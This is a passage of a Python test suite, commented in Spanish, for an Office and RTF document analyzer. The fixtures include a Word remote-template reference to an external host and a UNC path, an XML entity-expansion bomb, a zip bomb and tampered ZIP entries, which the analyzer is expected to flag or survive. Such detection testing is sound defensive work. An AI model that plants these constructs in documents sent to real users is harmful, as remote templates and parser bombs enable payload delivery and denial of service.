    res = _rtf_scan(b"{\\rtf1{\\*\\objdata 0102{\\*\\comment ffff}0304}}", time.monotonic() + 10)
    assert res.objects == [b"\x01\x02\x03\x04"]


# --------------------------------------------------------------------------- XML de Office


async def test_flat_opc_remote_template(analyzer, make_ctx):
    xml = (
        '<?xml version="1.0" standalone="yes"?><?mso-application progid="Word.Document"?>'
        '<pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">'
        '<pkg:part pkg:name="/word/_rels/settings.xml.rels" '
        'pkg:contentType="application/vnd.openxmlformats-package.relationships+xml"><pkg:xmlData>'
        + rels(("attachedTemplate", "https://203.0.113.8/t.dotm", "External")).split("?>", 1)[1]
        + "</pkg:xmlData></pkg:part></pkg:package>"
    ).encode()
    res = await run(analyzer, make_ctx, xml, "doc.xml", "xml")
    assert "office.remote_template" in res


async def test_word2003_xml_attached_template(analyzer, make_ctx):
    xml = (
        b'<?xml version="1.0"?><w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">'
        b'<w:docPr><w:attachedTemplate w:val="\\\\198.51.100.20\\s\\t.dot"/></w:docPr>'
        b"<w:body><w:p><w:r><w:t>Hola</w:t></w:r></w:p></w:body></w:wordDocument>"
    )
    res = await run(analyzer, make_ctx, xml, "doc.xml", "xml")
    assert "office.remote_template" in res


# --------------------------------------------------------------------------- entradas hostiles


async def test_entity_expansion_bomb_in_office_xml(analyzer, make_ctx):
    ents = '<!ENTITY a0 "lol">' + "".join(
        f'<!ENTITY a{i} "{("&a" + str(i - 1) + ";") * 10}">' for i in range(1, 10)
    )
    xml = (
        f'<?xml version="1.0"?><!DOCTYPE pkg:package [{ents}]><?mso-application progid="Word.Document"?>'
        '<pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage"><pkg:part pkg:name="/x">'
        "<pkg:xmlData><x>&a9;</x></pkg:xmlData></pkg:part></pkg:package>"
    ).encode()
    t0 = time.perf_counter()
    res = await run(analyzer, make_ctx, xml, "doc.xml", "xml")
    assert time.perf_counter() - t0 < 20
    assert all(f.severity <= Severity.LOW for f in res.values())


async def test_random_bytes_with_office_extension(analyzer, make_ctx):
    data = random.Random(7).randbytes(20000)
    res = await run(analyzer, make_ctx, data, "factura.doc", "unknown")
    assert res == {}


async def test_corrupted_docx(analyzer, make_ctx):
    good = ooxml({"word/document.xml": word_document(paragraph("x"))})
    res = await run(analyzer, make_ctx, good[: len(good) // 2], "factura.docx", "zip")
    assert res["office.corrupted"].severity == Severity.LOW


async def test_zip_bomb_part_is_bounded(analyzer, make_ctx):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", b"<w:document>" + b" " * 60_000_000 + b"</w:document>")
    data = buf.getvalue()
    assert len(data) < 1_000_000
    t0 = time.perf_counter()
    res = await run(analyzer, make_ctx, data, "x.docx")
    assert time.perf_counter() - t0 < 20
    assert "office.partial_analysis" in res


async def test_password_protected_zip_entries(analyzer, make_ctx):
    good = bytearray(ooxml({"word/document.xml": word_document(paragraph("x"))}))
    # marcar todas las entradas como cifradas (bit 0 del flag): zipfile no las puede leer
    idx = 0
    while (idx := good.find(b"PK\x03\x04", idx)) >= 0:
        good[idx + 6] |= 1
        idx += 4
    idx = 0
    while (idx := good.find(b"PK\x01\x02", idx)) >= 0:
        good[idx + 8] |= 1
        idx += 4
    res = await run(analyzer, make_ctx, bytes(good), "x.docx")
    assert all(f.severity <= Severity.LOW for f in res.values())


def test_child_matching_uses_sha256():
    blob = b"abc"
    assert make_artifact(blob).sha256 == hashlib.sha256(blob).hexdigest()
